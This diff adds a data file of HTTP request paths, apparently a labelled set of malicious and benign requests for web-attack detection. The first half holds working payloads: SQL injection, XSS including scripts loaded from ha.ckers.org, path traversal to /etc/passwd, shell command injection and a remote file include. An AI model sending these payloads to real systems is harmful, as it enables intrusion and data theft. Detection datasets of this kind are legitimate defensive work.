@@ -1,0 +1,200 @@
+/j2kdmfw4.cfc?<script>cross_site_scripting.nasl</script>
+/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
+/examples/jsp/jsp2/jspx/index.php?user_langue=../../../../../../../../../../etc/passwd
+/0rufe52p.php3?<script>cross_site_scripting.nasl</script>
+/static//..\..\..\..\..\..\..\..\etc/passwd
+/cgi-915/a1stats/a1disp3.cgi?../../../../../../../etc/passwd
+/main.php?stuff="ping,-w,9000,-n,1,4.3.2.1&rem,
+/_vti_bin/shtml.exe
+/help.php?q="rm\x0cq43711515&rem\x0c
+/main.php?stuff=";rm\x09q18442351\x09#
+/cgi-bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
+/main.php?stuff="ping -w 10000 -n 1 4.3.2.1&rem
+/nuh3zirz.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/bin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
+/o6ebbirj.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/viewcvs.cgi/?cvsroot=<script>foo</script>
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') ORDER BY 1058#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/m2fpztty.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/sawmillcl.exe?ho+{complete_version}
+/sscript/
+/cgi-bin/webplus?script=/../../../../etc/passwd
+/subscriptions.part
+/g8nu2yy7.jspa?<script>cross_site_scripting.nasl</script>
+/top.php?stuff=';rm q26271527 #
+/scripts/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
+/7dbjwpw6.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgibin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
+/top.php?stuff="ping -w 7000 -n 1 1.2.3.4&rem
+/cgi-bin/index.php?p='nessus
+/main.php?stuff="sleep 11 #
+/en-us/odzk29aa.nsf?<script>document.cookie="testtfvh=2141;"</script>
+/aspne~1*/a.aspx	recid=101533' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND 'Tvgv'='Tvgv
+/webct*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 100
+/aspnec*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 102
+/aspnr*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 103
+/aspnee*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 104
+/webct?*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 112
+/aspns*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 64
+/aspnt*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 96
+/aspnen*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 112
+/webct~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 113
+/aspnw*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 114
+/aspnep*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 116
+/webcw*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 120
+/webcta*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 64
+/aspner*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 96
+/webctb*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 1
+/aspnes*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 16
+/webctc*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 2
+/aspnet*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 32
+/webcte*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 4
+/eventum/forgot_password.php?email=\"><script>alert(document.cookie)</script>
+/ddoworrl.do?<script>document.cookie="testvlau=8517;"</script>
+/megabook/admin.cgi?login=<script>alert('vulnerable')</script>
+/initscripts/
+/gazette-subscription/
+/htbin/sensepost.exe?/c+dir
+/bmeun223.idc?<meta http-equiv=set-cookie content="testhhwu=7044">
+/examples/jsp/jsp2/jspx/showcat.php?cat=1'
+/b5xdqgz2.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/cal/index.php?entry='
+/javascript/contents.exe
+' OR '1'='1' #
+' OR '1'='1' %00
+' OR '1'='1' %16
+OR 1=1
+OR 1=0
+OR x=x
+OR x=y
+OR 1=1#
+OR 1=0#
+OR x=x#
+OR x=y#
+OR 1=1--
+OR 1=0--
+OR x=x--
+OR x=y--
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>alert("XSS");</script>&search=1
+0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+<h1><font color=blue>hellox worldss</h1>
+<BODY ONLOAD=alert('hellox worldss')>
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 2002--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 3032#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 3938--
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533 ORDER BY 1#
+/webcs*~1*/a.aspx	recid=101533 AND SLEEP(5)
+/bemarket/postscript/postscript.php?p_mode=XXpathXX
+/biblioteca/bib_form.php?CLASSPATH=XXpathXX
+/714640/
+/canon_mv920/
+/javascript/oa.bak
+/1234000793052540/
+/sc3osx1/
+/associatedcontent/
+/5991-0722/
+/javascript/b2b.o
+/genomics/
+/yongfa/
+/046077/
+/cgi-home/printenv.tmp
+/237884539_2849c27e29/
+/apachemanual/
+/q75647695
+/1234000263054348/
+/142249/
+/tvsquadpodcastfinal/
+/taunus/
+/blad_zinio1/
+/parliamentary_copyright/
+/javascript/1991.log
+/elitserien/
+/127180/
+/2006_regionals/
+/179117/
+/m2l2k_28/
+/dj playboy the trance of love/
+/javascript/foo.shtml
+/javascript/webcgi.tar
+/042068/
+/about6/
+/businessobjectsxi/
+/ayb-astro/
+/749746p1/
+/20051110-5/
+/n_banner/
+/flag-eng/
+/tcpdump2ascii/
+/1111831186/
+/msg27524958/
+/javascript/product.xslt
+/javascript/forums.xml
+/428874/
+/javascript/ie.stackdump
+/acrobat-8/
+/w_pg05c2/
+/lights-out/
+/iss_39/
+/javascript/components.pfx
+/matilda1/
+/gilmore_amicus/
+/msg87697/
+/omegaconstellationpiepan/
+/javascript/share.err
+/1004359386/
+/kgc2005/
+/javascript/ma.cfm
+/20050207_facebook/
+/tracker061202/
+/pantyhose-sex/
+/orleanist/
+/starwalk-bounce/
+/javascript/sell.cnf
+/conversionorperversion/
+/development.php?root_prefix=http://cirt.net/rfiinc.txt??
+/bottone_collabora/
+/javascript/phpmyadmin.key
+/tacklockerdesigntrunks/
+/barack_obama/
+/media_advisories/
+/player.save
+/news1164661200/
+/javascript/hour.csproj
+/javascript/program.ora
+/school of rock/
+/01619286999/
+/lonisemail/
+/120670/
+/webpub/
+/reghelp/
+/open.txt
+/objectweb-footer/
+/hdr_needcreditcard263x26/
+/escrowsuppliersad_e/
+/000027952/
+/7 worlds collide - live at the st james/
+/feast_03b/
+/0471295639/
+/product_esm/
+/cerics_eb/
+/javascript/soft.fcgi
+/493128686/
+/homeir/
+/2000569262048080_0/
+/967216195_s/
+/javascript/fetch.html
+/javascript/edit.meta
+/javascript/ss.nsf
+/btnlogin/
